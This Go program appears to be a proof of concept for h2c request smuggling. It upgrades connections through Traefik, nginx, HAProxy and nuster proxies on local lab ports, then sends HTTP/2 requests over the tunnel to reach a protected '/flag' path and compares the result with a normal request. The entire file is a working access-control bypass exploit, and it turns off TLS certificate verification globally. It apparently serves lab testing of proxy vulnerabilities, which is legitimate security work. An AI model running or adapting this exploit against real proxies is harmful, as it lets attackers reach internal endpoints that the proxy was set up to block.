package main

import (
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"time"

	"golang.org/x/net/http2"
)

type connWrapper struct {
	io.ReadWriteCloser
}

func (c connWrapper) LocalAddr() net.Addr {
	return nil
}

func (c connWrapper) RemoteAddr() net.Addr {
	return nil
}

func (c connWrapper) SetDeadline(t time.Time) error {
	return nil
}

func (c connWrapper) SetReadDeadline(t time.Time) error {
	return nil
}

func (c connWrapper) SetWriteDeadline(t time.Time) error {
	return nil
}

func init() {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true, NextProtos: []string{}}

}

func main() {
	traefikHTTP()
	log.Println("---------------")
	nginxHTTP()
    log.Println("---------------")
	traefikv1HTTP()
    log.Println("---------------")
	haproxyHTTP()
    log.Println("---------------")
	nusterHTTP()
	log.Println("---------------")
	traefikHTTPS()
	log.Println("---------------")
	traefikv1HTTPS()
	log.Println("---------------")
	nginxHTTPS()
    log.Println("---------------")
	haproxyHTTPS()
    log.Println("---------------")
	nusterHTTPS()

}

func traefikHTTP() {
	log.Println("Try Traefik HTTP")
	client, err := getUpgradedClient("http://127.0.0.1:8080")
	if err != nil {
		log.Print(err)
		return
	}
	sendProtectedReq(client, "http://127.0.0.1:8080/flag")
}
func traefikHTTPS() {
	log.Println("Try Traefik HTTPS")
	client, err := getUpgradedClient("https://127.0.0.1:8443")
	if err != nil {
		log.Print(err)
		return
	}
	sendProtectedReq(client, "https://127.0.0.1:8443/flag")
}

func traefikv1HTTP() {
	log.Println("Try Traefik v1 HTTP")
	client, err := getUpgradedClient("http://127.0.0.1:8082")
	if err != nil {
		log.Print(err)
		return
	}
	sendProtectedReq(client, "http://127.0.0.1:8082/flag")
}
func traefikv1HTTPS() {
	log.Println("Try Traefik v1 HTTPS")
	client, err := getUpgradedClient("https://127.0.0.1:8445")
	if err != nil {
		log.Print(err)
		return
	}
	sendProtectedReq(client, "https://127.0.0.1:8445/flag")
}

func nginxHTTP() {
	log.Println("Try nginx HTTP")
	client, err := getUpgradedClient("http://127.0.0.1:8081")
	if err != nil {
		log.Print(err)
		return
	}
	sendProtectedReq(client, "http://127.0.0.1:8081/flag")
}

func nginxHTTPS() {
	log.Println("Try nginx HTTPS")
	client, err := getUpgradedClient("https://127.0.0.1:8444")
	if err != nil {
		log.Print(err)
		return
	}
	sendProtectedReq(client, "https://127.0.0.1:8444/flag")
}

func haproxyHTTP() {
	log.Println("Try haproxy HTTP")
	client, err := getUpgradedClient("http://127.0.0.1:8083")
	if err != nil {
		log.Print(err)
		return
	}
	sendProtectedReq(client, "http://127.0.0.1:8083/flag")
}

func haproxyHTTPS() {
	log.Println("Try haproxy HTTPS")
	client, err := getUpgradedClient("https://127.0.0.1:8446")
	if err != nil {
		log.Print(err)
		return
	}
	sendProtectedReq(client, "https://127.0.0.1:8446/flag")
}

func nusterHTTP() {
	log.Println("Try nuster HTTP")
	client, err := getUpgradedClient("http://127.0.0.1:8084")
	if err != nil {
		log.Print(err)
		return
	}
	sendProtectedReq(client, "http://127.0.0.1:8084/flag")
}

func nusterHTTPS() {
	log.Println("Try nuster HTTPS")
	client, err := getUpgradedClient("https://127.0.0.1:8447")
	if err != nil {
		log.Print(err)
		return
	}
	sendProtectedReq(client, "https://127.0.0.1:8447/flag")
}

func sendProtectedReq(client *http.Client, urlFlag string) {
	log.Println("Try normal request")
	resp, err := http.DefaultClient.Get(urlFlag)
	if err != nil {
		log.Print("error in normal request", err)
	}
	log.Println("Try to send another request in the upgraded connection")
	respflag, err := client.Get(urlFlag)
	if err != nil {
		log.Fatal(err)
	}
	all, err := ioutil.ReadAll(respflag.Body)
	if err != nil {
		log.Fatal(err)
	}
	if respflag.StatusCode != resp.StatusCode {
		log.Printf("different status code %d and %d", respflag.StatusCode, resp.StatusCode)
		fmt.Println(string(all))
	} else {
		log.Printf("same status code %d and %d", respflag.StatusCode, resp.StatusCode)
		log.Print("Seems OK (secure)")
	}
}

func mustUpgradeh2cRequest(url string) *http.Request {
	req, err := http.NewRequest(http.MethodGet, url, http.NoBody)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Add("Connection", "Upgrade, HTTP2-Settings")
	req.Header.Set("Upgrade", "h2c")
	req.Header.Set("HTTP2-Settings", "AAMAAABkAARAAAAAAAIAAAAA")
	return req
}

func tryToUpgrade(url string) (net.Conn, error) {
	req := mustUpgradeh2cRequest(url)
	log.Println("Try to upgrade")
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("upgrade failed: %w", err)
	}
	if resp.StatusCode != 101 {
		all, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return nil, fmt.Errorf("upgrade failed (no switch protocol receive): %w", err)
		}
		return nil, fmt.Errorf("upgrade failed (no switch protocol receive): %+v %s", resp, all)
	}

	log.Println("Switched success")

	backConn, ok := resp.Body.(io.ReadWriteCloser)
	if !ok {
		return nil, errors.New("unable to ged the read write closer")
	}
	return connWrapper{backConn}, nil
}

func getUpgradedClient(url string) (*http.Client, error) {
	conn, err := tryToUpgrade(url)
	if err != nil {
		return nil, err
	}
	t2 := &http2.Transport{
		DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
			return conn, nil
		},
		AllowHTTP: true,
	}
	return &http.Client{
		Transport: t2,
	}, nil
}
